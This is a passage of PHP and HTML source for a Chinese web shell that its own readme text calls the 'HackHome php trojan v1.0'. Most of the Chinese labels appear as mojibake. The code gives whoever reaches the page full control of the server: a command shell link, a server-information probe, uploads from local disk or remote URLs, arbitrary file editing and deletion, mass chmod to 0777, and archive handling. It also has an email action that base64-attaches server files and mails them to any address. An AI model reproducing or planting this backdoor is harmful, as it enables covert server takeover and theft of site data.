                   lyr.write(txt)
                   lyr.close()
           }
           else if (ie4) document.all["overDiv"].innerHTML = txt
           //if (tr) { trk(); }
   }
   function showObject(obj) {
           if (ns4) obj.visibility = "show"
           else if (ie4) obj.visibility = "visible"
   }
   function hideObject(obj) {
           if (ns4) obj.visibility = "hide"
           else if (ie4) obj.visibility = "hidden"
   }
   function moveTo(obj,xL,yL) {
           obj.left = xL
           obj.top = yL
   }
   </script>
   <a href="?tools=phpshell"
      onMouseOut="nd();return true;"
      onMouseOver="drc(' »ù±¾ÃüÁî£º<br>ÁÐ³öÎÄ¼þÒÔ¼°Ä¿Â¼:<font color=red>ls</font><br>½âÑ¹Ëõ:<font color=red>tar xvzf filename.tar.gz</font><br>ÏÔÊ¾·þÎñÆ÷´ÅÅÌ·ÖÅä:<font color=red>df -h</font><br>ÏÔÊ¾µ±Ç°Â·¾¶:<font color=red>pwd<br>»¹ÓÐºÜ¶àµÄÃüÁî×Ô¼ºÑÐ¾¿°É</font>','phpshellÃüÁî');return true;" target=_blank>¡¾<span class=title>phpshell¹¤¾ß</span>¡¿</a>
   <a href=#0 onClick=javascript:window.open('http://e345.com.ru/webadmin/ColorHex.htm','','scrollbars=yes,width=650,height=400') onMouseOut="nd();return true;" onMouseOver="drc('<br>·½±ãÖ±¹ÛµÄ»ñÈ¡ÈÎÒâÑÕÉ«µÄ´úÂë~£¡<br>','ÑÕÉ«´úÂëÊ°È¡Æ÷');return true;">¡¾<span class=title>µ÷É«ÅÌ</span>¡¿</a>
        <a href="?tools=env"
      onMouseOut="nd();return true;"
      onMouseOver="drc('<?php
       echo"<font color=darkgreen>·þÎñÆ÷µØÖ·:</font>";
              echo getenv("SERVER_ADDR").":".getenv("SERVER_PORT")."<br>";
             echo" <font color=darkgreen>Host:</font>{$SERVER_NAME}<br><font color=darkgreen>WWW·þÎñÄ¬ÈÏÂ·¾¶£º</font>{$DOCUMENT_ROOT} <br>";
              echo"<font color=darkgreen>½âÒëÒýÇæ:</font>";
       echo getenv("SERVER_SOFTWARE")."<br>";
       echo"<font color=darkgreen>²Ù×÷ÏµÍ³:</font>";
       echo PHP_OS."<br>";
       echo"<font color=darkgreen> ¿Õ¼ä´óÐ¡:</font>";
       echo @intval(diskfreespace(".") / (1024 * 1024)).'Mb<br>';
       echo"<font color=darkgreen>½Å±¾³¬Ê±Ê±¼ä:</font>";
       echo get_cfg_var("max_execution_time")."Ãë<br>";
       echo"<font color=darkgreen> ¿ÉÉÏ´«×î´óµ¥ÎÄ¼þ:</font>";
       echo get_cfg_var("upload_max_filesize").'<br>';
       echo"<font color=darkgreen> °²È«Ä£Ê½:</font>";
       if (get_cfg_var("safe_mode")) echo"<font color=red>´ò¿ª</font>";
       else echo"¹Ø±Õ";
              if (function_exists("gzopen"))echo "<br>Zlib¿ÉÓÃ";else echo"<br><font color=red>Zlib²»¿ÉÓÃ</font>";
       if (function_exists("imageline"))echo " <br>GD¿ÉÓÃ";else echo"<br><font color=red>GD²»¿ÉÓÃ</font>";
       if (function_exists("fsockopen"))echo " <br>Socket¿ÉÓÃ";else echo"<br><font color=red>Socket²»¿ÉÓÃ</font>";
       if (function_exists("session_start"))echo " <br>Session¿ÉÓÃ";else echo"<br><font color=red>Session²»¿ÉÓÃ</font>";
       if (function_exists("ftp_login"))echo " <br>FTP¿ÉÓÃ";else echo"<br><font color=red>ftp²»¿ÉÓÃ</font>";

   ?> ','·þÎñÆ÷»ù±¾ÐÅÏ¢');return true;" target=_blank>¡¾<span class=title>phpÌ½Õë</span>¡¿</a>
   <a href="?tools=changecode"
      onMouseOut="nd();return true;"
      onMouseOver="drc('¿ÉÒÔÔÚÏß×ª»»µÄ±àÂë£º<br>CRYPT_STD_DES<br>CRYPT_MD5<br>CRYPT_BLOWFISH<br>MD5<br>BASE64 ±àÂë/½âÂë<br>URL ±àÂë/½âÂë<br>UTF-8 ±àÂë/½âÂë','ÃÜÂë»òÕß±àÂë×ª»»');return true;" target=_blank>¡¾<span class=title>ÃÜÂë/±àÂë</span>¡¿</a>
   <a href="?tools=mysql"
      onMouseOut="nd();return true;"
      onMouseOver="drc('mysqlÊý¾Ý¿â¹ÜÀí','mysqlÊý¾Ý¿â¹ÜÀí');return true;" target=_blank>¡¾<span class=title>mysqlÊý¾Ý¿â¹ÜÀí</span>¡¿</a>
             <a href="?tools=readme"
      onMouseOut="nd();return true;"
      onMouseOver="drc('¡ôºÚ¿ÍÖ®¼ÒphpÄ¾Âí v1.0¡ô<br>±¾³ÌÐòÓÉ °¢½Ü ÖÆ×÷<br>¡¡2004Äê11ÔÂ30ÈÕ<br>1.¸ÄºÃÂ·¾¶ÎÊÌâ<br>2.¸ÄºÃÊôÐÔ½øÖÆ×ª»»ÎÊÌâ<br>3.³É¹¦ÊµÏÖÅúÁ¿ÐÞ¸ÄÎÄ¼þÊôÐÔ<br>4.Íê³É²Ù×÷²Ëµ¥<br>5.³É¹¦ÐÞ¸Äzip½âÑ¹³ö´íÎÊÌâ<br>6.½âÑ¹¸ñÊ½×Ô¶¯·ÖÎö','²Ù×÷ËµÃ÷');return true;" target=_blank>¡¾<span class=title>²Ù×÷ËµÃ÷</span>¡¿</a>
    <?php echo "·þÎñÆ÷Ê±¼ä£º".date("Y-m-d H:i:s",time())." "; ?>
   </td> </tr> </table><table class="t1" width="750" cellspacing="1" cellpadding="1">
   <tr class="t21"> <td class="t22" width="14%">
   <script language=javascript>
   ie4=(document.all)?true:false;
   ns4=(document.layers)?true:false;

   function toExit(){
   var args=toExit.arguments;
   var visible=args[0];
   if(ns4){
           theObj=eval("document.layers[\'"+args[1]+"\']");
           if(theObj)theObj.visibility=visible;
           }
   else if(ie4){
           if(visible=='show')visible='visible';
           if(visible=='hide')visible='hidden';
           theObj=eval("document.all[\'"+args[1]+"\']");
           if(theObj)theObj.style.visibility=visible;
           }

   }


   </script>
   <script>
   function setid()
   {
       var str='';
       if (window.fm.count.value<=0||window.fm.count.value><?php echo $upload_max;?>)
           window.fm.count.value=10;
       for (i=1;i<=window.fm.count.value;i++)
       {          if(i<10) tmp=0 ;else tmp='';
           str+=' '+tmp+i+'<input type=file name=userfile[] size=12> <input type="text" name="lastname[]" size=6> ÐÂÎÄ¼þÃû<br>';
           window.fms.innerHTML=str+'';
       }
   }

   function setid1()
   {
       var str='';
       if (window.uploadUrlForm.count.value<=0||window.uploadUrlForm.count.value><?php echo $upload_max;?>)
           window.uploadUrlForm.count.value=10;
       for (i=1;i<=window.uploadUrlForm.count.value;i++)
       {          if(i<10) tmp=0 ;else tmp='';
           str+=' '+tmp+i+'<input name=file1[] type=text value="http://"> url <input name=newurlname[] type=text size=6> ÐÂÎÄ¼þÃû<br>';
           window.url.innerHTML=str+'';
       }
   }
   function setid3()
   {
       var str='';
       if (window.main.count.value<=0||window.main.count.value><?php echo $upload_max;?>)
           window.main.count.value=10;
       for (i=1;i<=window.main.count.value;i++)
       {          if(i<10) tmp=0 ;else tmp='';
           str+=' '+tmp+i+'<textarea name="oldkeys[]" cols="14" rows="4"></textarea> ¡ú¡ú <textarea name="newkeys[]" cols="14" rows="4"></textarea> <br>';
           window.rep.innerHTML=str+'';
       }
   }

   </script>
   <div id=boysoft style="HEIGHT: 80px; LEFT: 75px; POSITION: absolute; TOP: 40px; VISIBILITY: hidden; WIDTH: 350px; Z-INDEX: 1"><table bgcolor=#CCCC00 border=1 cellpadding=0 cellspacing=0 height=80 width=300>
   <tbody><tr><td height=65 width="80%"><br><font color=#ffffff>
   <form action="?dir=<? echo"$dir";?>" method=post name=uploadUrlForm><br>¡¡¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ<br>¡¡´ÓurlÉÏ´«:<input type=text name=count value=5 size=2>  <input type=button onclick=setid1(); value=ÉÏ´«¸öÊý>
      <input name=action type=hidden value=urlupload>¡¡
      <div id=url>
      01<input name=file1[] type=text value='http://'> url <input name=newurlname[] type=text size=6> ÐÂÎÄ¼þÃû</div>¡¡ <input type="submit" value="ÍøÕ¾´«Êä"> </form>
      <form enctype="multipart/form-data" action="?dir=<? echo"$dir";?>" method="post" name=fm class="forn">¡¡¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ<br>¡¡´Ó±¾µØ´ÅÅÌÉÏ´«:
      <input type=text name=count value=5 size=2>  <input type=button onclick=setid(); value=ÉÏ´«¸öÊý>
      <div id=fms>
       01<input name="userfile[]" type="file" size=12> <input type="text" name="lastname[]" size=6>  ÐÂÎÄ¼þÃû<br> </div>
    ¡¡ÉÏ´«µÄÄ¿Â¼: <br>
    ¡¡<input type="text" name="filedir" value="<? echo"$dir";?>"><br>  ¡¡<input type="submit" value="±¾µØÉÏ´«"> <input type="reset" name="Submit" value="ÖØÖÃ"></form>
   </font></td></tr><tr align="center"> <td height=23 width="100%"><a href="javascript:toExit('hide','boysoft')"><font color=red>¹Ø±Õ´Ë´°¿Ú</font></a></td></tbody></table></div>

   <div id=boyconfig style="HEIGHT: 80px; LEFT: 75px; POSITION: absolute; TOP: 40px; VISIBILITY: hidden; WIDTH: 270px; Z-INDEX: 1"><table bgcolor=#CCCC00 border=1 cellpadding=0 cellspacing=0 height=80 width=270><tbody><tr><td height=65 width="80%"><br><font color=#ffffff>
   <form action="?dir=<? echo"$dir";?>" method=post name=config><br>¡¡¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ¡ö¡õ<br><font color=red>¡¡»ù±¾ÉèÖÃÐÞ¸Ä:</font><br><input name=action type=hidden value=config>
   ¡¡¡¡ÔÃÜÂë£º<input name=oldpassword type=password value=''size=12> £¨²»¸ÄÁô¿Õ£©<br>
   ¡¡¡¡ÐÂÃÜÂë£º<input name=newpassword type=password value=''size=12><br>
   ¡¡¡¡ÖØ¡¡¸´£º<input name=thpassword type=password value=''size=12><br>
   ¡¡¡¡½Å±¾³¬Ê±Ê±¼ä£º<input name=page_time_limit_new type=text value=<?php echo $page_time_limit;?> size=3> Ãë<br>
   ¡¡¡¡Ò»´Î×î´óÉÏ´«ÎÄ¼þÊý£º<input name=upload_max_new type=text value=<?php echo $upload_max;?> size=3> ¸öÎÄ¼þ<br>
   ¡¡¡¡wlc´ò°ü×î´óÈÝÁ¿£º<input name=wlczip_max_new type=text value=<?php echo $wlczip_max;?> size=3> Mb<br>
   ¡¡¡¡ÊÇ·ñÏÔÊ¾owner£º¡¡¡¡¡¡<input type="radio" name=show_owner_new value="1" <? if($show_owner) echo checked;?>>¿É¼û
                       <input type="radio"  name=show_owner_new value="0" <? if(!$show_owner) echo checked;?>>Òþ²Ø<br>
   ¡¡¡¡ÊÇ·ñÏÔÊ¾ÓÒ¼ü²Ù×÷²Ëµ¥£º<input type="radio" name=show_menu_new value="1" <? if($show_menu) echo checked;?>>ÏÔÊ¾
                       <input type="radio"  name=show_menu_new value="0" <? if(!$show_menu) echo checked;?>>¹Ø±Õ<br>
   ¡¡¡¡<input type="submit" value="È·ÈÏÐÞ¸Ä">¡¡<input type="reset" name="Submit2" value="ÖØÖÃ"><br></form>
   </font></td></tr><tr align="center"> <td height=23 width="100%"><a href="javascript:toExit('hide','boyconfig')"><font color=red>¹Ø±Õ´Ë´°¿Ú</font></a></td></tbody></table></div>
   <a href="javascript:toExit('show','boysoft')">¡úÉÏ´«ÎÄ¼þ¡û</a>
   </td>
   <td width="56%" ALIGN=left>
   <a href="javascript:toExit('show','file_replace')">¡¾<span class=title><font color=red>ÎÄ¼þÌæ»»</font></span>¡¿<font color=""></font></a><a href="javascript:toExit('show','boyconfig')">¡¾<span class=title><font color=red>»ù±¾ÉèÖÃ</font></span>¡¿<font color=""></font></a>
   <INPUT TYPE="button" VALUE="¹Ø±Õ´°¿Ú" NAM onClick="javascript:parent.close()" style="background-color: #8000FF; color: rgb(255,255,255)">
   <INPUT TYPE="button" VALUE="¡ûºóÍË" onClick="javascript:parent.history.back()" style="background-color: #8000FF; color: rgb(255,255,255)">
   <INPUT TYPE="button" VALUE="Ç°½ø¡ú" onClick="javascript:parent.history.forward()" style="background-color: #8000FF; color: rgb(255,255,255)">
   </td>
   <td valign="top" rowspan="5" width="30%">
   <font color=darkgreen>¹ÜÀí²Ù×÷ÌáÊ¾£º</font><br><font color=red>
   <?php
   $url_dirs=explode("/",$dir);for($i=1;$i<count($url_dirs);$i++) {$temps[$i]=rawurlencode($url_dirs[$i]);if($i==1) $temp=$temps[$i]; elseif($url_dirs[$i]!="") $temp.="/".$temps[$i]; }//ÖÐÎÄÁ´½ÓµØÖ·×ª»»

   if(!$userfile&&!$delfile&&!$deldir&&!$mkdir&&!$editfile&&!$editperm&&!$action) {
   echo "<center>»¶ÓÄãÊ¹ÓÃ<br>::ºÚ¿ÍÖ®¼ÒphpÄ¾Âí v1.0 ::<br>HackHome By Jack 2005-2-1</center>";    }
   if(@$userfile!="") {
       @$v=file_exists($filedir);
       if(!$v) {
           mkdir(@$filedir,0777);
       }
       @chmod($filedir,0777);
        for($i=0;$i<count($userfile);$i++)  {
       if(@$lastname[$i]!="") {
           $lastname[$i]=$lastname[$i];
       }
       else $lastname[$i]=$userfile_name[$i];
       if(file_exists("$filedir/$lastname[$i]")=="1")
                {if($userfile_name[$i]) echo "".$userfile_name[$i]."ÒÑ¾´æÔÚ,Çë¸ÄÃû»ò¸²¸ÇÉÏ´«!<br>";else echo "Ã»ÓÐÑ¡ÔñÎÄ¼þ<br>";   }

       else { if(@move_uploaded_file($userfile[$i],"$filedir/$lastname[$i]")) echo $userfile_name[$i]."ÒÑÉÏ´«<br>";//¶Ô¸¶1816µÄ
             elseif(@copy($userfile[$i],"$filedir/$lastname[$i]")) echo $userfile_name[$i]."ÒÑÉÏ´«<br>";//µÚÒ»ÖÖÉÏ´«·½Ê½
             else echo $userfile_name[$i]."ÉÏ´«Ê§°Ü<br>";

           }
       }
                                     }
   if(@$delfile!="") {
       if(file_exists($delfile)) @unlink($delfile);
       else {
           $xx="1";
           echo "ÎÄ¼þÒÑ²»´æÔÚ<br>";
       }
       if(!file_exists($delfile)&&$xx!="1") echo"$delfile É¾³ý³É¹¦";
       else echo "$delfile É¾³ýÊ§°Ü";
   }
   if ($action=='urlupload') {//´ÓurlÉÏ´«
         for($i=0;$i<count($file1);$i++){
         if (isset($file1[$i]) && ($file1[$i] != "")) {
            $url = $file1[$i];
            $file1[$i] = @basename(ereg_replace("^[a-zA-Z]*\:\/(.*)$", "\\1", $url));
            if (!$file1[$i]) {
              echo '´íÎó£ºBad URL to upload<br>';
            } else {if($newurlname[$i]) $file1[$i] = $newurlname[$i];
               if (($fd = @fopen($url, "r")) && ($fdd = @fopen($dir."/".$file1[$i], "w"))) {
                  while (!@feof($fd)) {
                     fwrite($fdd, @fread($fd, 1024));
                  }
                  @fclose($fd);
                  @fclose($fdd);
                  echo "ÎÄ¼þÒÑ¾´Ó<br>$url<br>ÉÏ´«µ½$file1[$i]<br>";
               } else {
                  echo "´íÎó:²»ÄÜÉÏ´«ÎÄ¼þ<br>$url<br>,¼ì²éurlÊÇ·ñ¿ÉÒÔ´ò¿ª/ÎÄ¼þÊÇ·ñÓÐ¿ÉÐ´È¨ÏÞ";
               }
            }
         } else {
            echo "´íÎó:Ã»ÓÐÊäÈëurlµØÖ·<br>";
         }
      } }

   if($action=='mkdir') { //´´½¨Ä¿Â¼
       $mkdirs="$dir/$key";
       if(is_dir("$mkdirs")) echo "$mkdirs ¸ÃÄ¿Â¼´æÔÚ";
       else {
           @mkdir("$mkdirs",0777);
           if(is_dir("$mkdirs")) echo "$mkdirs Ä¿Â¼´´½¨³É¹¦";
           else echo "$deldirs Ä¿Â¼´´½¨Ê§°Ü";
       }
   }
   if ($editfile!=""||$editfilename!="") {//±à¼ÎÄ¼þ²¿·Ö
       if($editfile!="")$filename1="$dir/$editfile";
       else $editfile=$editfilename;
       $filename="$dir/$editfilename";
       if($copy!="1"&& $temp_run!="1") {
           $editfiletxt=stripslashes("$editfiletxt");
           if(@writetofile("$filename","$editfiletxt")) echo "$filename Ð´Èë³É¹¦";
           else echo "$filename Ð´ÈëÊ§°Ü";
           if($editfile!=$editfilename) unlink($filename1);
       }
       if($copy=="1"&&$editfile==$editfilename) {
           echo"ÄúÒª¸´ÖÆ£¿±ØÐë¸øÐÂÎÄ¼þ¸Ä¸öÃû×Ö£¬ÏÖÔÚÁ½¸öÎÄ¼þÃûÏàÍ¬£¬Çë<a href='javascript:history.back(1)'>·µ»Ø</a>";
       }
       elseif($copy=="1"&&$editfile!=$editfilename){
           echo"¿ªÊ¼¸´ÖÆ...<br>";
           $lastfilename="$dir/$editfilename";
           $editfiletxt=stripslashes("$editfiletxt");
           writetofile("$lastfilename","$editfiletxt");
           if(file_exists($lastfilename)) echo "$lastfilename Ð´Èë³É¹¦";
           elseif(!file_exists($lastfilename)) echo "$lastfilename Ê§°Ü";
       }
   }

   if($editperm!="")//µ¥ÎÄ¼þ±à¼ÊôÐÔ²¿·Ö
   {
             $perming=base_convert($perming, 8, 10);
       @chmod("$dir/$fileperm","$perming");
       @$lastperm=substr(base_convert(fileperms("$dir/$fileperm"),10,8),-4);
       echo "$fileperm ÎÄ¼þÐÞ¸ÄºóµÄÊôÐÔÎª $lastperm";
   }
   if($action=='editperming')//ÅúÁ¿¼þ±à¼ÊôÐÔ²¿·Ö
   {
             for($j=0;$j<count($file);$j++)
               {
                $perming=base_convert($key, 8, 10);
         chmod("$dir/$file[$j]","$perming");
         $lastperm=substr(base_convert(fileperms("$dir/$file[$j]"),10,8),-4);
         echo "$file[$j] ÎÄ¼þÐÞ¸ÄºóµÄÊôÐÔÎª $lastperm<br>";}
   }

   if($action=='zip') {
       if(empty($file)) echo "Î´Ñ¡ÔñÑ¹ËõÎÄ¼þ»òÄ¿Â¼";
       elseif(empty($key)) echo "Î´ÊäÈëZIPÎÄ¼þÃû";
       else
       {
           $zip = new Zip;
           unset($zipfiles);
           for($k=0;isset($file[$k]);$k++)
           {
               $zipfile=$dir."/".$file[$k];
               if(is_dir($zipfile))
               {
                   unset($zipfilearray);
                   addziparray($file[$k]);
                   for($i=0;$zipfilearray[$i];$i++)
                   {
                       $filename=$zipfilearray[$i];
                       $filesize=@filesize($dir."/".$zipfilearray[$i]);
                       $fp=@fopen($dir."/".$filename,rb);
                       $zipfiles[]=Array($filename,@fread($fp,$filesize));
                       @fclose($fp);
                   }
               }
               else
               {
                   $filename=$file[$k];
                   $filesize=@filesize($zipfile);
                   $fp=@fopen($zipfile,rb);
                   $zipfiles[]=Array($filename,@fread($fp,$filesize));
                   @fclose($fp);
               }
           }
           $zip->Add($zipfiles,1);
           if(@fputs(@fopen("$dir/$key","wb"), $zip->get_file())) echo "$key ÎÄ¼þÑ¹Ëõ³É¹¦";
           else  echo "$key ÎÄ¼þÑ¹ËõÊ§°Ü";
       }
   }
   if($action=="cut"){
       if(empty($file)) echo "Î´Ñ¡Ôñ¼ôÇÐÎÄ¼þ";
       else
       {
           echo "ÎÄ¼þÒÑ¾³É¹¦¼ôÇÐµ½¼ôÇÐ°æ";
       }
   }
   if($action=="copy"){
       if(empty($file)) echo "Î´Ñ¡Ôñ¸´ÖÆÎÄ¼þ";
       else
       {
           echo "ÎÄ¼þÒÑ¾³É¹¦¸´ÖÆµ½¼ôÇÐ°æ";
       }
   }
   if($action=="parse"){
       if(empty($file)) echo "¼ôÇÐ°æÖÐÎÞÎÄ¼þÊý¾Ý£¬Õ³Ìù²»³É¹¦";
       elseif($olddir==$dir) echo "ÎÄ¼þÔ´Ä¿Â¼ÓëÄ¿±êÄ¿Â¼ÏàÍ¬£¬Õ³Ìù²»³É¹¦";
       else
       {
           $f=0;
           $d=0;
           if($act=="copy"){
               copymore($file);
               if($f+$d>0) echo "$f ¸öÎÄ¼þ $d ¸öÄ¿Â¼ Õ³Ìù³É¹¦<br>´ÓÄ¿Â¼£º$olddir <br>¸´ÖÆµ½£º$dir";
               else echo "ÎÄ¼þ¸´ÖÆÊ§°Ü";
           }
           else {
               cutmore($file);
               if($f+$d>0) echo "$f ¸öÎÄ¼þ $d ¸öÄ¿Â¼ Õ³Ìù³É¹¦<br>´ÓÄ¿Â¼£º$olddir <br>¼ôÇÐµ½£º$dir";
               else echo "ÎÄ¼þ¼ôÇÐÊ§°Ü";
           }
       }
   }
   if($action=="delete"){
       if(empty($file)) echo "Î´Ñ¡ÔñÉ¾³ýÎÄ¼þ";
       else
       {
           $f=0;
           $d=0;
           delmore($file);
           if($f+$d>0) echo "$f ¸öÎÄ¼þ $d ¸öÄ¿Â¼ É¾³ý³É¹¦";
           else echo "ÎÄ¼þÉ¾³ýÊ§°Ü";
       }
   }
   if($action=="rename"){
       if(!file_exists($dir."/".$oldname)) echo "$oldname ²»´æÔÚ";
       elseif(empty($newname)) echo "Î´ÊäÈëÐÂµÄÎÄ¼þÃû»òÄ¿Â¼Ãû";
       else
       {
           $newname=str_replace("'","",$newname);
           $newname=str_replace("\"","",$newname);
           $newname=str_replace("&","",$newname);
           $newname=str_replace(",","",$newname);
           $newname=str_replace(";","",$newname);
           $newname=str_replace("/","",$newname);
           $newname=str_replace("\\","",$newname);
           $newname=str_replace("`","",$newname);
           $rn=@rename($dir."/".$oldname,$dir."/".$newname);
           if($rn) echo "$oldname ÒÑ¾³É¹¦¸ÄÃûÎª£º$newname";
           else echo "¸ÄÃûÊ§°Ü";
       }
   }
   if($action=="wlczip"){//wlc·½Ê½Ñ¹Ëõ
                                 if($file) {
                                 $key=substr($key,0,-4);
                                 $size=0;
                                 $i=0;
                                 $fp1=@fopen("$key"."_$i.wlc","w");
                                 for($j=0;$j<=count($file)-1;$j++)wlczip("$file[$j]");
                                 fwrite($fp1,"$b|wlc|$c");
                                 if(fclose($fp1))echo"ÎÄ¼þÓÃwlc·½Ê½´ò°ü³É¹¦";else echo"ÎÄ¼þÑ¹ËõÊ§°Ü";}
                                 else echo "Î´Ñ¡ÔñÒªÑ¹ËõµÄÎÄ¼þ»òÎÄ¼þ¼Ð";
                                 }
   if($action=="tgz"){//tgz·½Ê½Ñ¹Ëõ
            $file_tmp1=$dir."/";
          if($file){
                    for($i=0;$i<count($file);$file_tmp1=$dir."/",$i++)
                        {$file_tmp1.=$file[$i];$file_tmp.=$file_tmp1;if($i!=count($file)-1) $file_tmp.=" ";};
      if(new tar($key, $file_tmp)) echo "Ñ¡ÖÐÎÄ¼þÒÑ¾³É¹¦Ñ¹Ëõµ½£º<br>$key";else echo "Ñ¹ËõÊ§°Ü";}
                          else echo "Î´Ñ¡ÔñÒªÓÃtgz·½Ê½Ñ¹ËõµÄÎÄ¼þ»òÎÄ¼þ¼Ð";
                    }
   if($action=="email"){//·¢ËÍÓÊ¼þ
   //$boundary = uniqid( "");//¶¨Òå·Ö½çÏß
   $boundary = base64_encode(time())."design.by.webadmin.2.0";
   $headers = "From: $from
   MIME-Version: 1.0
   X-Priority: 3
   Content-type: multipart/mixed; boundary=\"$boundary\"";//Éú³ÉÓÊ¼þÍ·
   $mimeType = "application/unknown";//MIMEÀàÐÍ
   $textType = ($T_type?"text/html":"text/plain");
   $body = "--$boundary
   Content-type: $textType; charset=gb2312
   Content-transfer-encoding: 8bit

   $body

   ";
   if(!empty($file)){
              for($i=0;$i<=count($file)-1;$i++) {
              if(!is_dir($filename = "$dir/$file[$i]")){
              $fd = fopen( $filename, "r" );
       $read=chunk_split(base64_encode(@fread($fd, filesize($filename))));
       fclose( $fd );
   $body.="--$boundary
   Content-type: $mimeType; name=".$file[$i]."
   Content-disposition: attachment; filename=".$file[$i]."
   Content-transfer-encoding: base64

   $read
   ";
   echo "¸½¼þ".$file[$i]."Ìí¼Ó³É¹¦<br>";
   } else echo $file[$i]."ÊÇÎÄ¼þ¼Ð²»ÄÜ·¢ËÍ<br>";
   }//end_for
         }//endif
    else echo "ÓÉÓÚÄãÃ»Ñ¡ÔñÎÄ¼þ£¬<br>ËùÒÔÃ»ÓÐ·¢ËÍ¸½¼þ";
   $body.="--$boundary--";
   mail($to, $subject, $body, $headers);
   echo "ÓÊ¼þ·¢ËÍµ½<br>".$to."<br>Íê±Ï,Çë²éÊÕ";
   }
   if($action=="config"){//ÐÞ¸ÄÃÜÂë
                 $file_self=@basename(ereg_replace("^[a-zA-Z]*\:\/(.*)$", "\\1", $GLOBALS["PHP_SELF"]));
                 $fp=@fopen("./$file_self","r");$msg=@fread($fp,@filesize("./$file_self"));

   if($oldpassword) { if($oldpassword!=$PHP_AUTH_PW) echo "ÔÀ´µÄÃÜÂë´íÎó£¬ÐÞ¸ÄÊ§°Ü";//ÐÞ¸ÄÃÜÂë
                        elseif($newpassword!=$thpassword) echo "Á½´ÎÊäÈëµÄÐÂÃÜÂë²»Ò»ÖÂ£¬ÇëÖØÊä£¡";
                        else {$msg=@str_replace("".md5($PHP_AUTH_PW)."","".md5($newpassword)."",$msg);} }
               $msg=@str_replace("_limit=".$page_time_limit."","_limit=".$page_time_limit_new."",$msg);//ÐÞ¸Ä½Å±¾³¬Ê±Ê±¼ä
            $msg=@str_replace("upload_max=".$upload_max."","upload_max=".$upload_max_new."",$msg);
               $msg=@str_replace("wlczip_max=".$wlczip_max."","wlczip_max=".$wlczip_max_new."",$msg);
               $msg=@str_replace("show_owner=".$show_owner."","show_owner=".$show_owner_new."",$msg);
               $msg=@str_replace("show_menu=".$show_menu."","show_menu=".$show_menu_new."",$msg);
                @fclose($fp);
                $fp=@fopen("./$file_self","w");
               @fwrite($fp,$msg);
              if(@fclose($fp)) echo "ÄãµÄ»ù±¾ÉèÖÃÒÑ¾ÐÞ¸Ä";
              else echo "ÐÞ¸ÄÊ§°Ü£¡";
   }
   if($action=="extract"){//ËùÓÐ½âÑ¹Ëõ/½â°ü
        if(empty($file)) echo "Î´Ñ¡ÔñÐèÒª½â°ü/½âÑ¹µÄÎÄ¼þ";
        elseif(empty($key)) echo "Î´ÊäÈë½âÑ¹µ½µÄÄ¿Â¼Ãû";
       $pth_key = explode("/",$key);
      for($i=0;isset($pth_key[$i]);$i++){
        if(!$pth_key[$i]) continue;$pthss_key.=$pth_key[$i]."/";
        if(!is_dir($pthss_key)) @mkdir($pthss_key,0777);
      }
        if(substr($file[0], -3)=='zip'){//zip·½Ê½½âÑ¹Ëõ
           $zip = new Zip;
           $zipfile=$dir."/".$file[0];
           $array=$zip->get_list($zipfile);
           $count=count($array);
           $f=0;
           $d=0;
           for($i=0;$i<$count;$i++) {
               if($array[$i][folder]==0) {
                   if($zip->Extract($zipfile,$key,$i)>0) $f++;
               }
               else $d++;
           }
           if($i==$f+$d) echo "$file[0] ½âÑ¹³É¹¦<br>($f ¸öÎÄ¼þ $d ¸öÄ¿Â¼)";
           elseif($f==0) echo "$file[0] ½âÑ¹Ê§°Ü";
           else echo "$file[0] Î´½âÑ¹ÍêÕû<br>(ÒÑ½âÑ¹ $f ¸öÎÄ¼þ $d ¸öÄ¿Â¼)";
   }

   elseif(substr($file[0], -3)=='wlc'){//wlc·½Ê½½âÑ¹Ëõ
                     if(wlcunzip("$key",$dir."/".$file[0])) echo "$file[0]³É¹¦½â°üµ½<br>$key";
                     else echo "$file[0]½â°üÊ§°Ü";
                    }
   elseif(substr($file[0], -3)=='tgz'||substr($file[0], -6)=='tar.gz'||substr($file[0], -3)=='tar')
                   {//tgz·½Ê½½âÑ¹Ëõ
                         $dir_tmp.=$dir;$dir_tmp.="/".$file[0];
                        if(new tarExtract($dir_tmp, $key)) echo "$file[0]³É¹¦½âÑ¹Ëõµ½Ä¿Â¼£º<br>$key";
                    else echo"$file[0]½âÑ¹ËõÊ§°Ü";
                    }
   else echo "ÇëÈ·ÈÏÄãÊÇ·ñÑ¡ÔñµÄÊÇ¿ÉÒÔ½â°ü/½âÑ¹µÄÎÄ¼þÀàÐÍ£¨zip,wlc,tgz,tar,tar.gz)";
   }

   if($action=="file_replace_keyword"){
       if(empty($file)) echo "Î´Ñ¡ÔñÒªÌæ»»µÄÎÄ¼þ";
       else
       {
   for($i=0;$i<=count($oldkeys)-1;$i++)
   {$oldkeys[$i]=stripslashes("$oldkeys[$i]");$newkeys[$i]=stripslashes("$newkeys[$i]");}
   for($i=0;$i<=count($file)-1;$i++) replace_file($file[$i]);  echo "ÎÄ¼þÌæ»»Íê³É<br>$oldkeys[0]Ìæ»»Îª¡ú$newkeys[0]";
           }
   }
   if($action=="file_replace_find"){
       if(empty($file)) echo "Î´Ñ¡ÔñÒª²éÕÒµÄÎÄ¼þ";
       else
       {
   for($i=0;$i<=count($oldkeys)-1;$i++)
   {$oldkeys[$i]=stripslashes("$oldkeys[$i]");$newkeys[$i]=stripslashes("$newkeys[$i]");}
   for($i=0;$i<=count($file)-1;$i++) replace_file_find($file[$i]);    echo "ÎÄ¼þ²éÕÒÍê³É<br>";
           }
   }

   if($action=="file_replace_gb_2_big5" || $action=="file_replace_big5_2_gb" || $action=="file_replace_gb_2_utf8"){
       if(empty($file)) echo "Î´Ñ¡ÔñÒª×ª»»µÄÎÄ¼þ";
       else
       { for($i=0;$i<=count($file)-1;$i++) replace_file($file[$i]);    echo "ÎÄ¼þ×ª»»Íê³É";
           }
   }

   ?>
   </font>
   </td>
   </tr>
   <tr class="t21">
